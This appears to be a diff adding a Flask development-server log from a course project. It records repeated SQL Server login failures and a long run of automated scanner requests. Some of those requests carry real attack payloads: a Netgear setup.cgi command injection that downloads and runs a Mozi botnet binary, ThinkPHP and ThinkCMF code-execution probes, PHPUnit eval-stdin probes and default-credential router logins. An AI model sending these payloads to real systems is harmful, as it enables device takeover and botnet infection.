@@ -1,0 +1,986 @@
+ * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
+127.0.0.1 - - [10/Nov/2020 05:02:58] "POST /login?next=%2F HTTP/1.1" 200 -
+[2020-11-10 05:03:05,285] ERROR in app: Exception on /login [POST]
+Traceback (most recent call last):
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/base.py", line 2276, in _wrap_pool_connect
+    return fn()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 363, in connect
+    return _ConnectionFairy._checkout(self)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 773, in _checkout
+    fairy = _ConnectionRecord.checkout(pool)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 492, in checkout
+    rec = pool._do_get()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/impl.py", line 139, in _do_get
+    self._dec_overflow()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/util/langhelpers.py", line 68, in __exit__
+    compat.reraise(exc_type, exc_value, exc_tb)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/util/compat.py", line 153, in reraise
+    raise value
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/impl.py", line 136, in _do_get
+    return self._create_connection()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 308, in _create_connection
+    return _ConnectionRecord(self)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 437, in __init__
+    self.__connect(first_connect_check=True)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 652, in __connect
+    connection = pool._invoke_creator(self)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/strategies.py", line 114, in connect
+    return dialect.connect(*cargs, **cparams)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/default.py", line 489, in connect
+    return self.dbapi.connect(*cargs, **cparams)
+pyodbc.ProgrammingError: ('42000', '[42000] [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Cannot open database "hellowworlddb.database.windows.net" requested by the login. The login failed. (4060) (SQLDriverConnect)')
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/flask/app.py", line 1982, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/flask/app.py", line 1614, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/flask/app.py", line 1517, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/flask/_compat.py", line 33, in reraise
+    raise value
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/flask/app.py", line 1612, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/flask/app.py", line 1598, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/udacityadmin/nd081-c1-provisioning-microsoft-azure-vms-project-starter-master/FlaskWebProject/views.py", line 67, in login
+    user = User.query.filter_by(username=form.username.data).first()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/query.py", line 3287, in first
+    ret = list(self[0:1])
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/query.py", line 3065, in __getitem__
+    return list(res)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/query.py", line 3389, in __iter__
+    return self._execute_and_instances(context)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/query.py", line 3411, in _execute_and_instances
+    querycontext, self._connection_from_session, close_with_result=True
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/query.py", line 3426, in _get_bind_args
+    mapper=self._bind_mapper(), clause=querycontext.statement, **kw
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/query.py", line 3404, in _connection_from_session
+    conn = self.session.connection(**kw)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/session.py", line 1133, in connection
+    execution_options=execution_options,
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/session.py", line 1139, in _connection_for_bind
+    engine, execution_options
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/session.py", line 432, in _connection_for_bind
+    conn = bind._contextual_connect()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/base.py", line 2242, in _contextual_connect
+    self._wrap_pool_connect(self.pool.connect, None),
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/base.py", line 2280, in _wrap_pool_connect
+    e, dialect, self
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/base.py", line 1547, in _handle_dbapi_exception_noconnection
+    util.raise_from_cause(sqlalchemy_exception, exc_info)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/util/compat.py", line 398, in raise_from_cause
+    reraise(type(exception), exception, tb=exc_tb, cause=cause)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/util/compat.py", line 152, in reraise
+    raise value.with_traceback(tb)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/base.py", line 2276, in _wrap_pool_connect
+    return fn()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 363, in connect
+    return _ConnectionFairy._checkout(self)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 773, in _checkout
+    fairy = _ConnectionRecord.checkout(pool)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 492, in checkout
+    rec = pool._do_get()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/impl.py", line 139, in _do_get
+    self._dec_overflow()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/util/langhelpers.py", line 68, in __exit__
+    compat.reraise(exc_type, exc_value, exc_tb)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/util/compat.py", line 153, in reraise
+    raise value
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/impl.py", line 136, in _do_get
+    return self._create_connection()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 308, in _create_connection
+    return _ConnectionRecord(self)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 437, in __init__
+    self.__connect(first_connect_check=True)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 652, in __connect
+    connection = pool._invoke_creator(self)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/strategies.py", line 114, in connect
+    return dialect.connect(*cargs, **cparams)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/default.py", line 489, in connect
+    return self.dbapi.connect(*cargs, **cparams)
+sqlalchemy.exc.ProgrammingError: (pyodbc.ProgrammingError) ('42000', '[42000] [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Cannot open database "hellowworlddb.database.windows.net" requested by the login. The login failed. (4060) (SQLDriverConnect)')
+(Background on this error at: http://sqlalche.me/e/f405)
+127.0.0.1 - - [10/Nov/2020 05:03:05] "POST /login?next=%2F HTTP/1.1" 500 -
+[2020-11-10 05:03:51,595] ERROR in app: Exception on /login [POST]
+Traceback (most recent call last):
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/base.py", line 2276, in _wrap_pool_connect
+    return fn()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 363, in connect
+    return _ConnectionFairy._checkout(self)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 773, in _checkout
+    fairy = _ConnectionRecord.checkout(pool)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 492, in checkout
+    rec = pool._do_get()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/impl.py", line 139, in _do_get
+    self._dec_overflow()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/util/langhelpers.py", line 68, in __exit__
+    compat.reraise(exc_type, exc_value, exc_tb)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/util/compat.py", line 153, in reraise
+    raise value
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/impl.py", line 136, in _do_get
+    return self._create_connection()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 308, in _create_connection
+    return _ConnectionRecord(self)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 437, in __init__
+    self.__connect(first_connect_check=True)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 652, in __connect
+    connection = pool._invoke_creator(self)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/strategies.py", line 114, in connect
+    return dialect.connect(*cargs, **cparams)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/default.py", line 489, in connect
+    return self.dbapi.connect(*cargs, **cparams)
+pyodbc.ProgrammingError: ('42000', '[42000] [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Cannot open database "hellowworlddb.database.windows.net" requested by the login. The login failed. (4060) (SQLDriverConnect)')
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/flask/app.py", line 1982, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/flask/app.py", line 1614, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/flask/app.py", line 1517, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/flask/_compat.py", line 33, in reraise
+    raise value
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/flask/app.py", line 1612, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/flask/app.py", line 1598, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/udacityadmin/nd081-c1-provisioning-microsoft-azure-vms-project-starter-master/FlaskWebProject/views.py", line 67, in login
+    user = User.query.filter_by(username=form.username.data).first()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/query.py", line 3287, in first
+    ret = list(self[0:1])
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/query.py", line 3065, in __getitem__
+    return list(res)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/query.py", line 3389, in __iter__
+    return self._execute_and_instances(context)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/query.py", line 3411, in _execute_and_instances
+    querycontext, self._connection_from_session, close_with_result=True
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/query.py", line 3426, in _get_bind_args
+    mapper=self._bind_mapper(), clause=querycontext.statement, **kw
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/query.py", line 3404, in _connection_from_session
+    conn = self.session.connection(**kw)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/session.py", line 1133, in connection
+    execution_options=execution_options,
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/session.py", line 1139, in _connection_for_bind
+    engine, execution_options
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/session.py", line 432, in _connection_for_bind
+    conn = bind._contextual_connect()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/base.py", line 2242, in _contextual_connect
+    self._wrap_pool_connect(self.pool.connect, None),
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/base.py", line 2280, in _wrap_pool_connect
+    e, dialect, self
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/base.py", line 1547, in _handle_dbapi_exception_noconnection
+    util.raise_from_cause(sqlalchemy_exception, exc_info)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/util/compat.py", line 398, in raise_from_cause
+    reraise(type(exception), exception, tb=exc_tb, cause=cause)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/util/compat.py", line 152, in reraise
+    raise value.with_traceback(tb)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/base.py", line 2276, in _wrap_pool_connect
+    return fn()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 363, in connect
+    return _ConnectionFairy._checkout(self)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 773, in _checkout
+    fairy = _ConnectionRecord.checkout(pool)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 492, in checkout
+    rec = pool._do_get()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/impl.py", line 139, in _do_get
+    self._dec_overflow()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/util/langhelpers.py", line 68, in __exit__
+    compat.reraise(exc_type, exc_value, exc_tb)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/util/compat.py", line 153, in reraise
+    raise value
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/impl.py", line 136, in _do_get
+    return self._create_connection()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 308, in _create_connection
+    return _ConnectionRecord(self)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 437, in __init__
+    self.__connect(first_connect_check=True)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 652, in __connect
+    connection = pool._invoke_creator(self)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/strategies.py", line 114, in connect
+    return dialect.connect(*cargs, **cparams)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/default.py", line 489, in connect
+    return self.dbapi.connect(*cargs, **cparams)
+sqlalchemy.exc.ProgrammingError: (pyodbc.ProgrammingError) ('42000', '[42000] [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Cannot open database "hellowworlddb.database.windows.net" requested by the login. The login failed. (4060) (SQLDriverConnect)')
+(Background on this error at: http://sqlalche.me/e/f405)
+127.0.0.1 - - [10/Nov/2020 05:03:51] "POST /login?next=%2F HTTP/1.1" 500 -
+127.0.0.1 - - [10/Nov/2020 05:47:46] "GET /None HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 06:06:03] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 06:22:50] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 07:20:54] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 07:31:49] "GET /portal/redlion HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 07:46:11] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 07:46:12] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [10/Nov/2020 08:21:28] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 08:55:09] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 09:12:13] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 09:56:58] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 10:17:04] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 11:04:56] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 11:11:41] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 12:12:06] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 12:12:06] "POST /api/jsonws/invoke HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 12:12:07] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 12:12:07] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 12:12:07] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 12:12:07] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 12:12:08] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 12:12:08] "GET /console/ HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 12:12:08] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 12:12:09] "GET /login?next=%2F%3FXDEBUG_SESSION_START%3Dphpstorm HTTP/1.1" 200 -
+127.0.0.1 - - [10/Nov/2020 12:12:09] "GET /login?next=%2F%3Fa%3Dfetch%26content%3D%3Cphp%3Edie%28%2540md5%28HelloThinkCMF%29%29%3C%252Fphp%3E HTTP/1.1" 200 -
+127.0.0.1 - - [10/Nov/2020 12:29:51] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 12:58:27] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 13:26:05] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 14:04:28] "GET /config/getuser?index=0 HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 14:15:56] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 15:04:36] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 15:05:28] "GET /TP/public/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 15:05:29] "GET /TP/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 15:05:29] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 15:05:29] "GET /html/public/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 15:05:30] "GET /public/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 15:05:31] "GET /TP/html/public/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 15:05:31] "GET /elrekt.php HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 15:30:27] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 15:34:13] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 16:30:07] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 17:03:59] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 17:41:09] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 18:12:10] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 18:21:05] "GET /hudson HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 19:02:53] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 19:30:46] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 19:30:46] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 19:30:46] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 19:47:44] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 20:09:12] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 20:13:39] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 20:13:39] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 20:13:40] "POST /api/jsonws/invoke HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 20:13:40] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 20:13:41] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 20:13:41] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 20:13:41] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 20:13:41] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 20:13:42] "GET /console/ HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 20:13:42] "GET /login?next=%2F%3Fa%3Dfetch%26content%3D%3Cphp%3Edie%28%2540md5%28HelloThinkCMF%29%29%3C%252Fphp%3E HTTP/1.1" 200 -
+127.0.0.1 - - [10/Nov/2020 20:13:42] "GET /login?next=%2F%3FXDEBUG_SESSION_START%3Dphpstorm HTTP/1.1" 200 -
+127.0.0.1 - - [10/Nov/2020 20:37:31] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 20:37:31] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [10/Nov/2020 20:42:53] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 22:03:39] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 22:06:18] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 22:29:58] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 22:39:16] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [10/Nov/2020 22:51:35] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [10/Nov/2020 23:40:33] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 00:18:05] "GET /manager/html HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 00:45:43] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 01:11:24] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 01:29:53] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 01:53:56] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 01:55:55] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 01:55:55] "GET /nmaplowercheck1605059754 HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 01:55:55] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 01:55:56] "GET /evox/about HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 01:55:56] "GET /HNAP1 HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 01:55:56] "POST /sdk HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 01:55:56] "HEAD / HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 01:55:56] "HEAD /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 01:56:25] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 01:56:25] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 01:57:28] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 02:33:07] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 02:35:46] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 02:37:57] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 02:38:12] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 02:38:12] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 02:57:26] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 03:14:51] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 04:04:52] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 04:04:53] "GET /static/content/bootstrap.min.css HTTP/1.1" 304 -
+127.0.0.1 - - [11/Nov/2020 04:04:54] "GET /static/content/site.css HTTP/1.1" 304 -
+127.0.0.1 - - [11/Nov/2020 04:04:55] "GET /static/scripts/modernizr-2.6.2.js HTTP/1.1" 304 -
+127.0.0.1 - - [11/Nov/2020 04:05:26] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 04:05:27] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 04:05:29] "GET /static/images/sign-in-with-ms.svg HTTP/1.1" 304 -
+127.0.0.1 - - [11/Nov/2020 04:05:29] "GET /static/scripts/jquery-1.10.2.js HTTP/1.1" 304 -
+127.0.0.1 - - [11/Nov/2020 04:05:29] "GET /static/scripts/respond.js HTTP/1.1" 304 -
+127.0.0.1 - - [11/Nov/2020 04:05:29] "GET /static/scripts/modernizr-2.6.2.js HTTP/1.1" 304 -
+127.0.0.1 - - [11/Nov/2020 04:06:10] "GET /browserconfig.xml HTTP/1.1" 404 -
+[2020-11-11 04:06:33,667] ERROR in app: Exception on /login [POST]
+Traceback (most recent call last):
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/base.py", line 2276, in _wrap_pool_connect
+    return fn()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 363, in connect
+    return _ConnectionFairy._checkout(self)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 773, in _checkout
+    fairy = _ConnectionRecord.checkout(pool)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 492, in checkout
+    rec = pool._do_get()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/impl.py", line 139, in _do_get
+    self._dec_overflow()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/util/langhelpers.py", line 68, in __exit__
+    compat.reraise(exc_type, exc_value, exc_tb)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/util/compat.py", line 153, in reraise
+    raise value
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/impl.py", line 136, in _do_get
+    return self._create_connection()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 308, in _create_connection
+    return _ConnectionRecord(self)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 437, in __init__
+    self.__connect(first_connect_check=True)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 652, in __connect
+    connection = pool._invoke_creator(self)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/strategies.py", line 114, in connect
+    return dialect.connect(*cargs, **cparams)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/default.py", line 489, in connect
+    return self.dbapi.connect(*cargs, **cparams)
+pyodbc.ProgrammingError: ('42000', '[42000] [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Cannot open database "hellowworlddb.database.windows.net" requested by the login. The login failed. (4060) (SQLDriverConnect)')
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/flask/app.py", line 1982, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/flask/app.py", line 1614, in full_dispatch_request
+    rv = self.handle_user_exception(e)
